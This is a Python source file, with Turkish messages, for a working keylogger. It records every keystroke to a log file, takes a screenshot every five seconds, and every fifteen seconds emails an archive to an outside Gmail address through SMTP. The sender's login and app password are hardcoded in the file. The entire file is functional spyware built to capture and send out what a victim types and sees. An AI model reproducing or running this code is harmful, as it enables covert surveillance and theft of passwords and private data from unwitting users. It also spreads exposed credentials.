import pynput.keyboard
import threading
import pyautogui
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


log = open("Logs\\logs.txt", "w")
counter = 1

def callback_function(key):
    try:
        print('Alfanumerik anahtar {0} tuşlandı'.format(key.char))
        log.write(key.char)
        log.flush()
        
    except AttributeError:
        print('Özel anahtar {0} tuşlandı'.format(key))
       
        if key == key.space:
            tus = " "
        elif key == key.enter:
            tus = "\n[ENTER]\n"
        elif key == key.backspace:
            tus="\n[BACKSPACE]"
        elif key == key.tab:
            tus="\n[TAB]"
        elif key == key.caps_lock:
            tus="\n[CAPSLOCK]"
        elif key == key.shift or key == key.shift_r:
            tus="\n[SHIFT]"
        elif key == key.ctrl_l or key == key.ctrl_r:
            tus="\n[CTRL]"
        elif key == key.esc:
            tus="\n[ESC]" 
        elif key == key.right:
            tus = "\n[RIGHT]"
        elif key == key.left:
            tus = "\n[LEFT]"
        elif key == key.up:
            tus = "\n[UP]"
        elif key == key.down:
            tus = "\n[DOWN]"
        elif key == key.cmd:
            tus = "\n[CMD]"
        elif key == key.delete:
            tus = "\n[DELETE]"
        elif key == key.alt_l or key == key.alt_r:
            tus = "\n[ALT]"
        else:
            tus = str(key)
        log.write(tus)
        log.flush()

def send_email(message):
        
    sender_email = "stockcontroltest@gmail.com"
    sender_password = "xwitsvtlsobeamoe"

    receiver_email = "eferoglu1967@gmail.com"

    subject = "Rar Dosyası"

    rar_file = message

    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject

    msg.attach(MIMEText("New Log", 'plain'))

    attachment = open(rar_file, 'rb')
    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % rar_file)
    msg.attach(part)

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587) 
        server.starttls()
        server.login(sender_email, sender_password)
        text = msg.as_string()
        server.sendmail(sender_email, receiver_email, text)
        server.quit()
        print("E-posta gönderildi!")
    except Exception as e:
        print("E-posta gönderme hatası:", str(e))

def thread_function():
    send_email("Rar Files\\deneme.rar")
    timer_object = threading.Timer(15,thread_function)
    timer_object.start()

def take_screenshot():
    global counter
    ekran=pyautogui.screenshot()
    ekran.save(f"Images\\ekran{counter}.jpg")
    counter += 1
    timer_object = threading.Timer(5,take_screenshot)
    timer_object.start()

keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
with keylogger_listener:
    take_screenshot()
    thread_function()
    keylogger_listener.join()


log.close()
    



